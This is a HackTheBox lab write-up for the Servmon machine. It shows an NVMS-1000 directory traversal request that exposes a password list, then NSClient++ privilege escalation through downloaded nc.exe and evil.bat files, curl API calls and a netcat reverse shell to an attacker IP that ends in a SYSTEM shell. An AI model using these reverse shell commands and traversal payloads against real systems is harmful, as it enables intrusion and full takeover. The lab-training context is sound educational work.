---
title: Hackthebox Servmon Writeup
date: 2020-05-06 20:00:00 +0530
categories: [Hackthebox, Machine]
tags: [hackthebox, windows, port forwarding, nsclient++, nvms-1000]
image:
  path: /assets/img/post/hackthebox/servmon/main.png
---

# Information:~$

| Title         | Details       |
| -------- |:--------:|
| Name         |Servmon |
| IP     | 10.10.10.184      |
| Difficulty| Easy      |
| Points | 20 |
| OS | Windows|
| Creator | [thek](https://www.hackthebox.eu/home/users/profile/4615)|


# Brief:~$

Servmon was a easy rated `Windows` machine that was a bit of a journey as user was pretty easy but `root` was a hell for me. We got `Anonymous FTP login` that allowed us to view an interesting file. `Initial Foothold` was gained by taking advantage of `NVMS` Server doing `Directory Traversal` Attack and reading sensitive file wih password for `Nadine` user. Being a Low privileged user we could read `Administrative` password of `NSClient++` amd by making few `API` request we were able to gain `nt authority\system` Shell 

# Reconnaissance:~$

As usual `nmap` scan

## Nmap:~$

```bash
nmap -sC -sV 10.10.10.184
```

We get a bunch of Interesting Information

```bash
# Nmap 7.80 scan initiated Sun Apr 12 20:11:38 2020 as: nmap -sC -sV -oN nmap/initial 10.10.10.184
Nmap scan report for 10.10.10.184
Host is up (0.20s latency).
Not shown: 991 closed ports
PORT     STATE SERVICE       VERSION
21/tcp   open  ftp           Microsoft ftpd
| ftp-anon: Anonymous FTP login allowed (FTP code 230)
|_01-18-20  12:05PM       <DIR>          Users
| ftp-syst: 
|_  SYST: Windows_NT
22/tcp   open  ssh           OpenSSH for_Windows_7.7 (protocol 2.0)
| ssh-hostkey: 
|   2048 b9:89:04:ae:b6:26:07:3f:61:89:75:cf:10:29:28:83 (RSA)
|   256 71:4e:6c:c0:d3:6e:57:4f:06:b8:95:3d:c7:75:57:53 (ECDSA)
|_  256 15:38:bd:75:06:71:67:7a:01:17:9c:5c:ed:4c:de:0e (ED25519)
80/tcp   open  http
135/tcp  open  msrpc         Microsoft Windows RPC
139/tcp  open  netbios-ssn   Microsoft Windows netbios-ssn
445/tcp  open  microsoft-ds?
5666/tcp open  tcpwrapped
6699/tcp open  napster?
8443/tcp open  ssl/https-alt
| fingerprint-strings: 
|   FourOhFourRequest, HTTPOptions, RTSPRequest, SIPOptions: 
|     HTTP/1.1 404
|     Content-Length: 18
|     Document not found
|   GetRequest: 
|     HTTP/1.1 302
|     Content-Length: 0
|     Location: /index.html
|     68.0
|_    host name. Leaving this blank will bind to all available IP addresses.
2 services unrecognized despite returning data. If you know the service/version, please submit the following fingerprints at https://nmap.org/cgi-bin/submit.cgi?new-service :
Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
# Nmap done at Sun Apr 12 20:14:51 2020 -- 1 IP address (1 host up) scanned in 193.28 seconds
```

We get few ports open but the main ones are 21(FTP), 22(SSH), 80(HTTP), 8443(HTTPS)

As Port `21(FTP)` allow Anonymous Login Let's start with it only

```bash
 ~/htb/boxes/Servmon >> ftp 10.10.10.184
Connected to 10.10.10.184.
220 Microsoft FTP Service
Name (10.10.10.184:vibhu): Anonymous
331 Anonymous access allowed, send identity (e-mail name) as password.
Password:
230 User logged in.
Remote system type is Windows_NT.
ftp> ls
200 PORT command successful.
125 Data connection already open; Transfer starting.
01-18-20  12:05PM       <DIR>          Users
226 Transfer complete.
ftp> cd users
250 CWD command successful.
ftp> ls
200 PORT command successful.
125 Data connection already open; Transfer starting.
01-18-20  12:06PM       <DIR>          Nadine
01-18-20  12:08PM       <DIR>          Nathan
226 Transfer complete.
ftp> cd Nadine
250 CWD command successful.
ftp> ls
200 PORT command successful.
125 Data connection already open; Transfer starting.
01-18-20  12:08PM                  174 Confidential.txt
226 Transfer complete.
ftp> 
```
We get some info like there are 2 users `Nathan` and `Nadine` and an interesting file `Confidential.txt`

let's download it on our `system`

```bash
ftp> get Confidential.txt
local: Confidential.txt remote: Confidential.txt
200 PORT command successful.
125 Data connection already open; Transfer starting.
226 Transfer complete.
174 bytes received in 0.41 secs (0.4152 kB/s)
ftp>
```
It contain some `Interesting` data for us

```bash
~/htb/boxes/Servmon >> cat Confidential.txt 
Nathan,

I left your Passwords.txt file on your Desktop.  Please remove this once you have edited it yourself and place it back into the secure folder.

Regards
Nadine
```
Now Let's move forward to  `PORT 80`

![Servmon](/assets/img/post/hackthebox/servmon/1.png)

NVMS-1000 Software

A quick `exploitdb` search show the software is vulnerable to `Directory Traversal Attack`


# Initial Foothold:~$

Now it’s time to exploit it

I used burp Suite to do Directory Traversal

Here's my `Final` Request

```
GET /../../../../../../../../../../../../Users/Nathan/Desktop/Passwords.txt HTTP/1.1
Host: 10.10.10.184
User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:68.0) Gecko/20100101 Firefox/68.0
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8
Accept-Language: en,hi;q=0.7,en-US;q=0.3
Accept-Encoding: gzip, deflate
Referer: http://10.10.10.184/
Connection: close
Cookie: dataPort=6063
Upgrade-Insecure-Requests: 1
DNT: 1
Cache-Control: max-age=0
```
**Output**

```
1nsp3ctTh3Way2Mars!
Th3r34r3To0M4nyTrait0r5!
B3WithM30r4ga1n5tMe
L1k3B1gBut7s@W0rk
0nly7h3y0unGWi11F0l10w
IfH3s4b0Utg0t0H1sH0me
Gr4etN3w5w17hMySk1Pa5$
```
Let's try SSH through these

## SSH:~$

I tried every password on `Nathan` User but was unsuccessful and was movin on so i thought let's try for Nadine too
and to my luck i got access using `L1k3B1gBut7s@W0rk`

```bash
ssh Nadine@10.10.10.184
```
Password = `L1k3B1gBut7s@W0rk`

Hurray We got User

```bash
Microsoft Windows [Version 10.0.18363.752]
(c) 2019 Microsoft Corporation. All rights reserved.

nadine@SERVMON C:\Users\Nadine\Desktop>whoami
servmon\nadine

nadine@SERVMON C:\Users\Nadine\Desktop>dir
 Volume in drive C has no label.
 Volume Serial Number is 728C-D22C

 Directory of C:\Users\Nadine\Desktop

08/04/2020  22:28    <DIR>          .
08/04/2020  22:28    <DIR>          ..
05/05/2020  12:34                34 user.txt
               1 File(s)             34 bytes
               2 Dir(s)  27,434,475,520 bytes free
```


# Enumeration:~$

Now Let's move on to `PORT 8443`

We have Nsclient++

![Servmon](/assets/img/post/hackthebox/servmon/2.png)

The site took a Century to load 

Let's see for it's exploit. A Quick search landed me [here](https://www.exploit-db.com/exploits/46802)

```
1. Grab web administrator password
- open c:\program files\nsclient++\nsclient.ini
or
- run the following that is instructed when you select forget password
	C:\Program Files\NSClient++>nscp web -- password --display
	Current password: SoSecret

2. Login and enable following modules including enable at startup and save configuration
- CheckExternalScripts
- Scheduler

3. Download nc.exe and evil.bat to c:\temp from attacking machine
	@echo off
	c:\temp\nc.exe 192.168.0.163 443 -e cmd.exe

4. Setup listener on attacking machine
	nc -nlvvp 443

5. Add script foobar to call evil.bat and save settings
- Settings > External Scripts > Scripts
- Add New
	- foobar
		command = c:\temp\evil.bat

6. Add schedulede to call script every 1 minute and save settings
- Settings > Scheduler > Schedules
- Add new
	- foobar
		interval = 1m
		command = foobar
```

So Accoding to exploit a `low privileged` user have the ability to read the the `Administrator Password` for the service 

```bash
nadine@SERVMON C:\Program Files\NSClient++>nscp web -- password --display
Current password: ew2x6SsGTxjRwXOT

nadine@SERVMON C:\Program Files\NSClient++>
```
We got the `Admin Passowrd` let's try to login

![Servmon](/assets/img/post/hackthebox/servmon/3.png)

You are not allowed

Let's Check Config File

```bash
nadine@SERVMON C:\Program Files\NSClient++>type nsclient.ini
╗┐# If you want to fill this file with all available options run the following command:
#   nscp settings --generate --add-defaults --load-all
# If you want to activate a module and bring in all its options use:
#   nscp settings --activate-module <MODULE NAME> --add-defaults
# For details run: nscp settings --help


; in flight - TODO
[/settings/default]

; Undocumented key
password = ew2x6SsGTxjRwXOT

; Undocumented key
allowed hosts = 127.0.0.1
.............
```

To our Bad only `localhost` is allowed

From here on there are `2 ways` to do it One is `Port Forwarding` and another one is `Curl`

I am going to do it with curl as `Website` was damm slow and I only got login screen 1 in 10 times

Acc to exploit we need to enable following modules including enable at startup and save configuration

>- CheckExternalScripts
>- Scheduler

But they are enabled by default you can verify that in config file

# Privilege Escalation:~$


## Nadine → Sysadmin:~$

Read about API of Nsclient++ [Here](https://docs.nsclient.org/api/rest/)

So Accoding to exploit 

Let's transfer `nc.exe` and `evil.bat` on machine


evil.bat
```
~/htb/boxes/Servmon >> cat evil.bat 
@echo off
C:\temp\nc.exe  10.10.14.168 443 -e cmd.exe
```

Create a `python server` on you system in the directory where both the files are located

> python -m SimpleHTTPServer 1377

On Victim Machine

```bash
nadine@SERVMON C:\Users\Nadine>powershell
Windows PowerShell                                          
Copyright (C) Microsoft Corporation. All rights reserved.   
                                                            
Try the new cross-platform PowerShell https://aka.ms/pscore6

PS C:\Users\Nadine> cd C:\Temp\

PS C:\Temp> wget http://<YOUR IP>:1337/evil.bat -o evil.bat

PS C:\Temp> wget http://<YOUR IP>:1337/nc.exe -o nc.exe

PS C:\Temp> ls


    Directory: C:\Temp                                                                                                                                               
                                                                                                                                                                     
                                                                                                                                                                     
Mode                LastWriteTime         Length Name                                                                                                                
----                -------------         ------ ----                                                                                                                                                                        
-a----       05/05/2020     14:04             53 evil.bat                                                                                                                                                                                                                    
-a----       05/05/2020     14:06          59392 nc.exe                                                                                                              
                                                                                                                                                                                                                                                                                                                           
PS C:\Temp> exit 

nadine@SERVMON C:\Users\Nadine>exit
```
Let's go to `NSClient Directory`

> cd C:/\"Program Files"/\"NSClient++"

Add our script in `NSClient++`  

*Command* run from normal shell
```bash
curl -s -k -u admin -X PUT https://localhost:8443/api/v1/scripts/ext/scripts/evil.bat --data-binary "C:\Temp\nc.exe 10.10.14.168 443 -e cmd.exe"
```

Now we `execute` the script

```bash
curl -s -k -u admin https://localhost:8443/api/v1/queries/evil/commands/execute?time=1m
```
Check Back on you machine and you must have `listened` something

```bash
 ~/htb/boxes/Servmon >> sudo nc -nvlp 443
listening on [any] 443 ...
connect to [10.10.14.168] from (UNKNOWN) [10.10.10.184] 49855
Microsoft Windows [Version 10.0.18363.752]
(c) 2019 Microsoft Corporation. All rights reserved.

C:\Users\Administrator\Desktop>whoami
whoami
nt authority\system

C:\Users\Administrator\Desktop>dir
dir
 Volume in drive C has no label.
 Volume Serial Number is 728C-D22C

 Directory of C:\Users\Administrator\Desktop

08/04/2020  23:12    <DIR>          .
08/04/2020  23:12    <DIR>          ..
05/05/2020  14:35                34 root.txt
               1 File(s)             34 bytes
               2 Dir(s)  27,341,996,032 bytes free

C:\Users\Administrator\Desktop>

```

# Resources:~$

| Topic | Link|
|-------|-----|
|NVMS-1000 Exploit|[Here](https://www.exploit-db.com/exploits/47774)|
|NSClient++ Exploit|[Here](https://www.exploit-db.com/exploits/46802)|
|NSClient++ API Queries|[Here](https://docs.nsclient.org/api/rest/queries/)|
|NSClient++ API Scripts|[Here](https://docs.nsclient.org/api/rest/scripts/)|

With this, we come to the end of the story of how I owned Servmon 😃

Thank you for reading !!!

*I would love to hear about any suggestions or queries.*

